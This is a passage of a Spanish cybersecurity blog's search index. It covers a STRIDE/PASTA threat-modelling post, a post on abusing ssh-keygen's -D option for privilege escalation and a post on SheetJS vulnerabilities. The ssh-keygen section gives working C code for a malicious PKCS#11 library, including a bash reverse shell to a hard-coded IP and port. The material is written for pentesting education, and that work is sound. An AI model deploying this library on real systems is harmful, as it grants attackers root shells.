adaptadas a tus necesidades, contribuir a la comunidad compartiendo nuevas reglas, integrar Nuclei en flujos de CI/CD o llevar a cabo un monitoreo continuo de tu infraestructura con las plantillas.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","Nuclei","Automatizaci\u00f3n","Plantilla"]},{"location":"es/blog/posts/16-03-2025/","title":"Modelado de Amenazas: Implementando STRIDE y PASTA en el mundo real","text":"","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#introduccion","title":"Introducci\u00f3n","text":"<p>En el mundo de la ciberseguridad, proteger aplicaciones y sistemas desde su fase de dise\u00f1o es crucial. Con la creciente sofisticaci\u00f3n de los ataques, el enfoque de Security by Design se ha convertido en una necesidad para las organizaciones. Dentro de esta estrategia, el modelado de amenazas es una t\u00e9cnica fundamental que permite identificar vulnerabilidades antes de que puedan ser explotadas.</p> <p>En este art\u00edculo, exploraremos dos de los modelos m\u00e1s efectivos para analizar y mitigar amenazas en proyectos reales: STRIDE y PASTA. Profundizaremos en sus caracter\u00edsticas, funcionamiento y c\u00f3mo pueden contribuir a la seguridad inform\u00e1tica desde una perspectiva de prevenci\u00f3n y mitigaci\u00f3n de riesgos.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#que-es-el-modelado-de-amenazas-y-por-que-es-necesario","title":"\u00bfQu\u00e9 es el Modelado de Amenazas y por qu\u00e9 es necesario?","text":"<p>El modelado de amenazas es un proceso para identificar posibles vectores de ataques contra un sistema y desarrollar estrategias para mitigarlos. Su objetivo es detectar fallos de seguridad desde la fase de dise\u00f1o, evitando costosos arreglos posteriores.</p> <p>Este enfoque proactivo permite evaluar los riesgos desde una perspectiva ofensiva y defensiva al mismo tiempo, ayudando a los equipos de desarrollo y seguridad a implementar medidas antes de que el problema ocurra. A trav\u00e9s del modelado de amenazas, las organizaciones pueden identificar activos cr\u00edticos, analizar vectores de ataque y aplicar los controles adecuados, reduciendo el impacto de posibles vulnerabilidades.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#beneficios-del-modelado-de-amenazas","title":"Beneficios del Modelado de Amenazas","text":"<p>El modelado de amenazas no solo mejora la postura de seguridad de una organizaci\u00f3n, sino que tambi\u00e9n aporta ventajas significativas a nivel operativo, legal y econ\u00f3mico:</p> <ul> <li> <p>Reducci\u00f3n del riesgo: Permite anticipar y corregir vulnerabilidades antes de que sean explotadas, evitando brechas de seguridad y ataques cibern\u00e9ticos.</p> </li> <li> <p>Ahorro de costos: Minimiza las reparaciones tard\u00edas y reduce la frecuencia de incidentes de seguridad, lo que se traduce en menores costos asociados a da\u00f1os y remediaci\u00f3n.</p> </li> <li> <p>Cumplimiento normativo: Facilita el cumplimiento de regulaciones y est\u00e1ndares como GDPR, ISO 27001 y NIST, asegurando que los sistemas cumplan con las mejores pr\u00e1cticas de seguridad.</p> </li> <li> <p>Mejora en la calidad del software: La seguridad se integra desde la fase inicial del desarrollo, evitando problemas cr\u00edticos en etapas m\u00e1s avanzadas del ciclo de vida del software.</p> </li> <li> <p>Facilidad en la toma de decisiones: Proporciona un enfoque sistem\u00e1tico y documentado para evaluar riesgos, permitiendo a las  organizaciones asignar recursos de manera m\u00e1s eficiente y tomar decisiones informadas sobre la seguridad.</p> </li> </ul>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#frameworks-de-modelado-de-amenaza","title":"Frameworks de modelado de amenaza","text":"<p>Existen diversos frameworks que se adaptan a diferentes contextos y necesidades organizacionales:</p> <ul> <li> <p>Frameworks basados en activos: Se centran en identificar y proteger los activos m\u00e1s valiosos de una organizaci\u00f3n, como datos sensibles o sistemas cr\u00edticos.</p> </li> <li> <p>Frameworks basados en atacantes: Analizan las motivaciones, capacidades y m\u00e9todos de posibles atacantes para anticipar sus movimientos.</p> </li> <li> <p>Frameworks basados en software: Dise\u00f1ados espec\u00edficamente para detectar vulnerabilidades en aplicaciones durante su desarrollo.</p> </li> <li> <p>Frameworks basados en riesgos: Eval\u00faan amenazas seg\u00fan su probabilidad e impacto potencial en los objetivos del negocio.</p> </li> </ul> <p>Entre los frameworks m\u00e1s utilizados en la industria destacan STRIDE y PASTA, cada uno con sus propias fortalezas y enfoques \u00fanicos para abordar la seguridad desde las primeras etapas del desarrollo.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#stride-identificacion-de-amenazas-basada-en-categorias","title":"STRIDE: Identificaci\u00f3n de Amenazas Basada en Categor\u00edas","text":"<p>Desarrollado por Microsoft, STRIDE es un modelo que clasifica las amenazas en seis categor\u00edas, permitiendo a los equipos de seguridad dise\u00f1ar defensas espec\u00edficas. Este enfoque estructurado ayuda a mitigar riesgos desde la fase de dise\u00f1o del software, mejorando la seguridad y reduciendo vulnerabilidades antes de que sean explotadas.</p> <p>STRIDE proporciona un marco sistem\u00e1tico para analizar cada componente del sistema en busca de vulnerabilidades espec\u00edficas. A continuaci\u00f3n, se detalla cada categor\u00eda de amenaza y las estrategias de mitigaci\u00f3n correspondientes:</p> <ul> <li> <p>Spoofing (Suplantaci\u00f3n de identidad): Ocurre cuando un atacante se hace pasar por otra entidad para obtener acceso no autorizado. Esto puede incluir falsificaci\u00f3n de identidades de usuarios, servicios o sistemas.</p> <ul> <li>Ejemplos: Phishing, falsificaci\u00f3n de cookies, suplantaci\u00f3n de URL.</li> <li>Mitigaci\u00f3n: Implementaci\u00f3n de autenticaci\u00f3n multifactor (MFA), uso de certificados digitales, y sistemas de gesti\u00f3n de identidades robustos.</li> </ul> </li> <li> <p>Tampering (Manipulaci\u00f3n de datos): Se refiere a la modificaci\u00f3n no autorizada de datos, ya sea en tr\u00e1nsito o en reposo. </p> <ul> <li>Ejemplos: Alteraci\u00f3n de datos en bases de datos, modificaci\u00f3n de par\u00e1metros en formularios web, inyecci\u00f3n SQL.</li> <li>Mitigaci\u00f3n: Uso de firmas digitales, control de integridad mediante funciones hash, implementaci\u00f3n de controles de acceso estrictos y validaci\u00f3n de entradas.</li> </ul> </li> <li> <p>Repudiation (Repudio): Ocurre cuando un usuario niega haber realizado una acci\u00f3n y no existe manera de probar lo contrario.</p> <ul> <li>Ejemplos: Un usuario que niega haber realizado una transacci\u00f3n fraudulenta o haber enviado un mensaje malicioso.</li> <li>Mitigaci\u00f3n: Registros de auditor\u00eda seguros y firmados, implementaci\u00f3n de firmas digitales para transacciones, y registros inmutables utilizando tecnolog\u00edas como blockchain.</li> </ul> </li> <li> <p>Information Disclosure (Divulgaci\u00f3n de informaci\u00f3n): Es la exposici\u00f3n no autorizada de informaci\u00f3n sensible a individuos que no deber\u00edan tener acceso a ella.</p> <ul> <li>Ejemplos: Fuga de datos personales, exposici\u00f3n de configuraciones internas, o visualizaci\u00f3n de errores detallados.</li> <li>Mitigaci\u00f3n: Encriptaci\u00f3n de datos en tr\u00e1nsito y en reposo, implementaci\u00f3n del principio de m\u00ednimo privilegio, y sanitizaci\u00f3n de errores visibles al usuario.</li> </ul> </li> <li> <p>Denial of Service (Denegaci\u00f3n de servicio): Ataques dise\u00f1ados para hacer que un sistema o aplicaci\u00f3n sea inaccesible para sus usuarios leg\u00edtimos.</p> <ul> <li>Ejemplos: Inundaci\u00f3n de solicitudes HTTP, agotamiento de recursos del servidor, o ataques DDoS distribuidos.</li> <li>Mitigaci\u00f3n: Implementaci\u00f3n de firewalls y sistemas de mitigaci\u00f3n DDoS, limitaci\u00f3n de tasas de solicitudes, y dise\u00f1o de arquitecturas escalables y redundantes.</li> </ul> </li> <li> <p>Elevation of Privilege (Escalada de privilegios): Ocurre cuando un usuario obtiene niveles de acceso superiores a los que le fueron asignados.</p> <ul> <li>Ejemplos: Explotaci\u00f3n de vulnerabilidades en sistemas operativos, inyecci\u00f3n de comandos, o desbordamiento de b\u00fafer.</li> <li>Mitigaci\u00f3n: Aplicaci\u00f3n del principio de m\u00ednimo privilegio, segmentaci\u00f3n de sistemas, actualizaciones de seguridad regulares, y validaci\u00f3n rigurosa de entradas.</li> </ul> </li> </ul>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#aplicaciones-practicas-de-stride","title":"Aplicaciones Pr\u00e1cticas de STRIDE","text":"<p>El modelo STRIDE es ampliamente utilizado en la industria de la ciberseguridad debido a su enfoque claro en la clasificaci\u00f3n de amenazas y la facilidad con la que se puede integrar en procesos de desarrollo seguro. Es especialmente \u00fatil en:</p> <ul> <li> <p>Dise\u00f1o de APIs seguras: Permite identificar y mitigar riesgos en la comunicaci\u00f3n entre servicios.</p> </li> <li> <p>Protecci\u00f3n de bases de datos: Ayuda a implementar medidas para evitar manipulaci\u00f3n o divulgaci\u00f3n de datos sensibles.</p> </li> <li> <p>Arquitecturas seguras para aplicaciones web y m\u00f3viles: Facilita la creaci\u00f3n de sistemas m\u00e1s robustos frente a ataques.</p> </li> </ul>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#herramientas-recomendadas-para-el-modelado-de-amenazas-con-stride","title":"Herramientas Recomendadas para el Modelado de Amenazas con STRIDE","text":"<p>Para facilitar la implementaci\u00f3n del modelo STRIDE, se pueden utilizar herramientas especializadas que automatizan la identificaci\u00f3n de amenazas y la generaci\u00f3n de estrategias de mitigaci\u00f3n:</p> <ul> <li> <p>Microsoft Threat Modeling Tool: Una herramienta oficial de Microsoft dise\u00f1ada para ayudar a los desarrolladores a identificar y mitigar amenazas de seguridad en sus aplicaciones.</p> </li> <li> <p>OWASP Threat Dragon: Una plataforma de c\u00f3digo abierto que permite el modelado de amenazas en aplicaciones de software.</p> </li> <li> <p>Threatspec: Una herramienta que facilita la automatizaci\u00f3n del modelado de amenazas, permitiendo su integraci\u00f3n en el desarrollo \u00e1gil y DevOps.</p> </li> </ul> <p>El uso de STRIDE en combinaci\u00f3n con estas herramientas permite una detecci\u00f3n m\u00e1s eficiente de vulnerabilidades y una mejor protecci\u00f3n de los sistemas desde su fase inicial.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#pasta-un-enfoque-basado-en-riesgos","title":"PASTA: Un Enfoque Basado en Riesgos","text":"<p>PASTA (Process for Attack Simulation and Threat Analysis) es un modelo m\u00e1s detallado, basado en el an\u00e1lisis de riesgos y la simulaci\u00f3n de ataques. A diferencia de STRIDE, que se centra en la categorizaci\u00f3n de amenazas, PASTA proporciona un enfoque hol\u00edstico, evaluando amenazas en funci\u00f3n del impacto potencial en el negocio.</p> <p>Las 7 Fases de PASTA son:</p> <ol> <li> <p>Definici\u00f3n de objetivos: Evaluaci\u00f3n de requerimientos de seguridad y amenazas espec\u00edficas para el negocio.</p> </li> <li> <p>Recopilaci\u00f3n de inteligencia: An\u00e1lisis del entorno, identificaci\u00f3n de actores malintencionados y recopilaci\u00f3n de datos sobre ataques previos.</p> </li> <li> <p>Modelado de la arquitectura del sistema: Evaluaci\u00f3n detallada de la infraestructura, software y dependencias del sistema.</p> </li> <li> <p>An\u00e1lisis de vulnerabilidades: Identificaci\u00f3n de debilidades utilizando herramientas de escaneo de seguridad y pruebas de penetraci\u00f3n.</p> </li> <li> <p>An\u00e1lisis de ataques: Simulaci\u00f3n de ataques potenciales para evaluar c\u00f3mo podr\u00edan explotarse las vulnerabilidades detectadas.</p> </li> <li> <p>Estrategia de mitigaci\u00f3n: Desarrollo de planes de respuesta y correcci\u00f3n basados en los hallazgos.</p> </li> <li> <p>Monitoreo y mejora continua: Implementaci\u00f3n de controles para la detecci\u00f3n temprana de amenazas y actualizaci\u00f3n de defensas.</p> </li> </ol>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#aplicaciones-practicas-de-pasta","title":"Aplicaciones Pr\u00e1cticas de PASTA","text":"<p>El uso de PASTA es especialmente \u00fatil en entornos empresariales donde es necesario alinear las estrategias de ciberseguridad con los objetivos comerciales y regulatorios. Su enfoque basado en riesgos permite priorizar esfuerzos y recursos en las amenazas m\u00e1s cr\u00edticas. </p> <p>Algunas de sus aplicaciones m\u00e1s comunes incluyen:</p> <ul> <li> <p>Protecci\u00f3n de infraestructuras cr\u00edticas: Empresas que manejan datos sensibles pueden utilizar PASTA para fortalecer sus sistemas frente a amenazas avanzadas.</p> </li> <li> <p>Cumplimiento normativo: Ayuda a cumplir con regulaciones como GDPR, ISO 27001 y NIST, al proporcionar un marco detallado de seguridad basado en riesgos.</p> </li> <li> <p>Seguridad en entornos DevOps: Su integraci\u00f3n con metodolog\u00edas \u00e1giles permite identificar riesgos y aplicar soluciones sin afectar la velocidad de desarrollo.</p> </li> </ul>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#herramientas-recomendadas-para-el-modelado-de-amenazas-con-pasta","title":"Herramientas Recomendadas para el Modelado de Amenazas con PASTA","text":"<p>Para la implementaci\u00f3n del modelo PASTA, se pueden utilizar herramientas que facilitan la simulaci\u00f3n de ataques y el an\u00e1lisis de vulnerabilidades:</p> <ul> <li> <p>AttackIQ: Plataforma de simulaci\u00f3n de ataques que ayuda a validar estrategias de seguridad mediante la automatizaci\u00f3n de escenarios de amenazas realistas.</p> </li> <li> <p>Cymulate: Herramienta que permite probar la resiliencia del sistema frente a diversas t\u00e1cticas de ataque a trav\u00e9s de simulaciones automatizadas de vectores de ataque.</p> </li> <li> <p>Mandiant Security Validation (anteriormente Verodin): Ayuda a evaluar la efectividad de los controles de seguridad en entornos empresariales mediante pruebas continuas basadas en inteligencia de amenazas.</p> </li> <li> <p>ThreatModeler: Plataforma automatizada que facilita la identificaci\u00f3n, priorizaci\u00f3n y gesti\u00f3n de amenazas a lo largo del ciclo de vida del desarrollo.</p> </li> </ul> <p>El modelo PASTA, con su enfoque basado en riesgos y simulaciones de ataque, se convierte en una herramienta clave para fortalecer la seguridad empresarial, permitiendo una mejor preparaci\u00f3n ante amenazas avanzadas y la optimizaci\u00f3n de estrategias de defensa.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#implementacion-practica-consideraciones-para-aplicar-stride-y-pasta","title":"Implementaci\u00f3n Pr\u00e1ctica: Consideraciones para Aplicar STRIDE y PASTA","text":"<p>Para integrar estos modelos en una estrategia de seguridad, se recomienda:</p> <ul> <li>Realizar an\u00e1lisis peri\u00f3dicos del sistema para identificar nuevas amenazas y evaluar la efectividad de los controles de seguridad.</li> <li>Definir controles de seguridad efectivos para cada categor\u00eda de amenaza identificada en STRIDE o PASTA.</li> <li>Capacitar a los equipos de desarrollo en modelado de amenazas y su impacto en la seguridad de las aplicaciones.</li> <li>Utilizar herramientas especializadas como Microsoft Threat Modeling Tool y OWASP Threat Dragon para estructurar los an\u00e1lisis y facilitar la automatizaci\u00f3n.</li> <li>Monitorear y actualizar constantemente los controles implementados para adaptarse a nuevas amenazas y vulnerabilidades emergentes.</li> <li>Integrar el modelado de amenazas en el ciclo de vida del desarrollo de software (SDLC) para garantizar que la seguridad sea una prioridad en todas las etapas.</li> </ul> <p>Estos enfoques no solo reducen riesgos, sino que tambi\u00e9n fomentan una cultura organizacional de seguridad proactiva, minimizando la posibilidad de incidentes y mejorando la resiliencia frente a ataques cibern\u00e9ticos.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/16-03-2025/#conclusion-y-perspectivas-futuras","title":"Conclusi\u00f3n y Perspectivas Futuras","text":"<p>El modelado de amenazas es una herramienta clave en la protecci\u00f3n de sistemas y aplicaciones contra ataques cibern\u00e9ticos. La combinaci\u00f3n de STRIDE y PASTA permite abordar amenazas desde diferentes perspectivas, facilitando la mitigaci\u00f3n de riesgos y la implementaci\u00f3n de estrategias de seguridad m\u00e1s robustas.</p> <p>Con la evoluci\u00f3n constante de las amenazas en el mundo digital, la integraci\u00f3n de estos modelos junto con tecnolog\u00edas emergentes, como la inteligencia artificial para la detecci\u00f3n de amenazas y el an\u00e1lisis de riesgos en tiempo real, ser\u00e1 esencial para el futuro de la ciberseguridad.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Modelado de amenazas","STRIDE","PASTA","Security by Design","An\u00e1lisis de riesgos","Seguridad inform\u00e1tica","DevSecOps","Protecci\u00f3n de datos","Vulnerabilidades"]},{"location":"es/blog/posts/17-10-2024/","title":"Abusando de ssh-keygen","text":"<p>SSH-Keygen es una herramienta que permite crear y gestionar claves SSH, esta herramienta esta presente en la mayor\u00eda de los sistemas UNIX hoy en d\u00eda como herramienta para facilitar la gesti\u00f3n de las claves SSH.</p> <p>En este articulo exploraremos un par de m\u00e9todos para abusar de esta herramienta con ciertas configuraciones como m\u00e9todo de persistencia o de escalada de privilegios en el sistema.</p> <p>En concreto abusaremos de una funcionalidad concreta de este binario que permite la carga de claves publicas desde una librer\u00eda de lectura de tarjetas, esta opci\u00f3n es el par\u00e1metro -D, su uso es el siguiente.</p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>","tags":["Ciberseguridad","Pentesting","SSH","Linux","SUID","Persistencia"]},{"location":"es/blog/posts/17-10-2024/#como-generamos-el-payload","title":"Como generamos el payload","text":"<p>Una vez explicado que nos lleva a poder explotar esta funci\u00f3n, vamos a explicar en mayor detalle como generar un payload, para ello primero de todo ser\u00e1 obtener una versi\u00f3n de pkcs11.h . En este archivo de cabeceras es donde se definen los tipos de datos necesarios para la funci\u00f3n de nuestra librer\u00eda que llamara ssh-keygen al usar el par\u00e1metro -D. </p> <p>En nuestro caso, para ello iremos al repositorio de Open Smart Card y descargaremos la versi\u00f3n que necesitamos de la siguiente url:</p> <p>GitHub - PKCS11</p> <p>Con este archivo procederemos a escribir un peque\u00f1o programa en C con la estructura necesaria para ser ejecutado por ssh-keygen, en nuestro caso este programa lanza una shell en bash.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Una vez compilado podemos cargarlo como librer\u00eda como indicamos en la introducci\u00f3n. </p>","tags":["Ciberseguridad","Pentesting","SSH","Linux","SUID","Persistencia"]},{"location":"es/blog/posts/17-10-2024/#caso-1-sudo-ssh-keygen","title":"Caso 1: Sudo SSH-Keygen","text":"<p>Vamos a explotar un escenario donde nuestro usuario tiene permisos para ejecutar el comando ssh-keygen como root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>En este ese caso, en lugar de hacer uso de una simple llamada a bash vamos a cargar una reverse shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, \"-c\" , \"bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\", NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Como resultado, al cargarla obtendremos una conexi\u00f3n como root en nuestro listener, podr\u00edamos cambiarlo para ejecutar una shell sencillamente como en el ejemplo de la secci\u00f3n de teor\u00eda .</p>","tags":["Ciberseguridad","Pentesting","SSH","Linux","SUID","Persistencia"]},{"location":"es/blog/posts/17-10-2024/#caso-2-ssh-keygen-suid","title":"Caso 2: SSH-Keygen SUID","text":"<p>En este escenario vamos a explotar un escenario algo menos com\u00fan donde ssh-keygen tiene el bit del SUID activado, en este caso para mantener los privilegios del SUID tenemos que cambiar un poco el c\u00f3digo de la librer\u00eda para que la shell mantenga los privilegios.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, \"-p\", NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Una vez compilado podemos ejecutar el comando para cargar la librer\u00eda y obtener una shell con los privilegios necesarios.</p>","tags":["Ciberseguridad","Pentesting","SSH","Linux","SUID","Persistencia"]},{"location":"es/blog/posts/17-10-2024/#reflexiones-finales","title":"Reflexiones Finales","text":"<p>Como se ha demostrado, ssh-keygen es una herramienta poderosa que, cuando est\u00e1 mal configurada o mal utilizada, puede convertirse en un riesgo significativo para la seguridad. Los escenarios presentados en este art\u00edculo destacan la importancia de configurar y restringir adecuadamente el acceso a binarios con privilegios elevados.</p> <p>Al comprender y gestionar proactivamente las capacidades y riesgos asociados con herramientas comunes como ssh-keygen, los administradores pueden garantizar la integridad y seguridad de sus sistemas.</p> <p>Note</p> <p>Adopte siempre el principio de privilegio m\u00ednimo y realice auditor\u00edas de seguridad regulares para minimizar las superficies de ataque.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Ciberseguridad","Pentesting","SSH","Linux","SUID","Persistencia"]},{"location":"es/blog/posts/19-01-2025/","title":"El d\u00eda que Dependabot conoci\u00f3 a SheetJS","text":"<p>Todo comenz\u00f3 hace unos d\u00edas con una notificaci\u00f3n de Dependabot. Mientras revisaba un repositorio de un proyecto interno, me encontr\u00e9 con el siguiente mensaje:</p> Alerta de Dependabot <p>Proced\u00ed con el workflow est\u00e1ndar de Dependabot para abordar los problemas, asumiendo que se trataba de una actualizaci\u00f3n rutinaria. Sin embargo, me sorprendi\u00f3 cuando las correcciones para ambas vulnerabilidades fallaron porque no se pudo encontrar la versi\u00f3n parcheada requerida.</p> Alerta de Dependabot por DoS en SheetJS Alerta de Dependabot por Prototype Pollution en SheetJS <p>Despu\u00e9s de algunas investigaciones, descubr\u00ed un conflicto entre npm y los desarrolladores de xlsx, debido a un problema con el token de la Autenticaci\u00f3n Multi Factor (MFA) de hace unos a\u00f1os. Como resultado, xlsx ha abandonado el ecosistema npm y ahora publica sus paquetes a trav\u00e9s de otra Redes de Distribuci\u00f3n de Contenidos (CDN) para la distribuci\u00f3n de sus paquetes. Esto ha introducido un nuevo nivel de complejidad, haciendo m\u00e1s dif\u00edcil para los usuarios de npm actualizar los paquetes y resolver vulnerabilidades de forma efectiva.</p> <p>Dado que nuestra aplicaci\u00f3n se vio afectada por estas vulnerabilidades, decid\u00ed profundizar en ellas para evaluar el riesgo de retrasar el parche y explorar posibles soluciones si fuera necesario, y tambi\u00e9n fue una buena excusa para escribir un art\u00edculo para el blog, un art\u00edculo que seguro puede ayudar a m\u00e1s de un desarrollador a decidir c\u00f3mo afrontar la misma situaci\u00f3n en SheetJS o xlsx. Con esto en mente, analicemos las dos vulnerabilidades reportadas por el dependabot con m\u00e1s detalle:</p>","tags":["Ciberseguridad","Gesti\u00f3n de Dependencias","Gesti\u00f3n de Vulnerabilidades","Desarrollo","NodeJS","Parches","Revisi\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/19-01-2025/#prototype-pollution-en-sheetjs-aka-cve-2023-30533","title":"Prototype Pollution en SheetJS aka CVE-2023-30533","text":"<p>Esta vulnerabilidad en SheetJs permite a un atacante subir creado especialmente para corromper los prototipos existentes de los objetos en la aplicaci\u00f3n. Prototype Pollution podr\u00eda conducir potencialmente a problemas serios como Ejecuci\u00f3n Remota de Comandos (RCE), Cross-Site Scripting (XSS) o Denegaciones de Servicios (DoS). Dependiendo del contexto, se trata de una amenaza importante.</p> <p>Indagando, encontr\u00e9 un art\u00edculo escrito por un investigador de Solid Labs que descubri\u00f3 la vulnerabilidad. Aunque este art\u00edculo est\u00e1 en ruso y parcialmente detr\u00e1s de un paywall, da alguna idea del contexto y el impacto de la vulnerabilidad. Por un lado el riesgo parece ser limitado, por el otro confirma que XSS se puede lograr con esta vulnerabilidad, aunque la prueba de concepto para el XSS est\u00e1 detr\u00e1s del paywall.</p> <p>Utilizando la parte gratuita disponible del art\u00edculo, pude crear un PoC b\u00e1sico para prototype pollution con un impacto limitado. Esto nos permite probar si nuestra aplicaci\u00f3n era vulnerable e implementar un parche espec\u00edfico para sanear el vector de ataque mientras que preparamos una actualizaci\u00f3n completa. Tambi\u00e9n utilizamos el PoC y revisando el commit que parcheaba esta vulnerabilidad, encontr\u00e9 que la vulnerabilidad ocurr\u00eda al importar una hoja con comentarios. La causa parece ser que los desarrolladores no previeron que las referencias a celdas pod\u00edan ser manipuladas por un atacante. Su soluci\u00f3n final fue validar que la referencia a las celdas fuera leg\u00edtimas.</p> <p>Sabiendo esto, podemos crear un parche local para la versi\u00f3n de nuestra biblioteca, pero habiendo trabajado como pentester varios a\u00f1os, ten\u00eda curiosidad de c\u00f3mo escalaba de prototype pollution a XSS. Revisar el parche fue clave para encontrar el vector XXS:</p> Commit que soluciona el XSS <p>Podemos ver que los desarrolladores a\u00f1adieron escapehtml a una l\u00ednea en el mismo commit que corrige la vulnerabilidad. Rastreando el c\u00f3digo hacia atr\u00e1s, podemos ver que la l\u00ednea corregida s\u00f3lo se ejecutaba cuando la biblioteca se usaba para parsear el XLS a HTML utilizando la funci\u00f3n make_html_row. En nuestro caso, como no utilizamos parsing HTML en nuestra aplicaci\u00f3n, esta vulnerabilidad no es cr\u00edtica, ya que no utilizamos la funci\u00f3n vulnerable. Sin embargo, hemos aplicado los dos parches localmente para mejorar la seguridad mientras que preparamos el actualizaci\u00f3n completa.</p> <p>Sabiendo esto, desarrolla un exploit para generar XLSX malicioso con un payload XSS es bastante sencillo. Sin embargo, para no facilitar la explotaci\u00f3n publicando un PoC para una vulnerabilidad dif\u00edcil de mitigar, no publicar\u00e9 un PoC funcional para explotar este XSS en un paquete que recibe 2,5 millones de descargas semanalmente.</p>","tags":["Ciberseguridad","Gesti\u00f3n de Dependencias","Gesti\u00f3n de Vulnerabilidades","Desarrollo","NodeJS","Parches","Revisi\u00f3n de C\u00f3digo"]},{"location":"es/blog/posts/19-01-2025/#sheetjs-denegacion-de-servicio-por-expresiones-regulares-redos-cve-2024-22363","title":"SheetJS Denegaci\u00f3n de Servicio por Expresiones Regulares (ReDoS) (CVE-2024-22363)","text":"<p>Esta vulnerabilidad permite a un atacante subir una archivo que cause un retraso significativo en una aplicaci\u00f3n explotando defectos en expresiones regulares en SheetJS. Aunque no es cr\u00edtica para nuestra aplicaci\u00f3n, me interesa replicar el problema y crear un parche virtual temporal hasta que la actualizaci\u00f3n est\u00e9 lista.</p> <p>El primer paso fue examinar el commit en el repositorio SheetJS. El c\u00f3digo mostraba varios patrones codiciosos regex, en particular el reportado se encuentra en el comentario &lt;!--). The researcher provided a PoC demonstrating how to exploit this vulnerability.</p> <p>Podemos verificar la vulnerabilidad de la siguiente manera:</p> <p> Prueba de Concepto para ReDoS <p>Mientras que el PoC muestra un retardo de 42 segundos, la carga de trabajo crece exponencialmente con archivos m\u00e1s grandes. Un archivo con un tama\u00f1o diez veces m\u00e1s grandes que 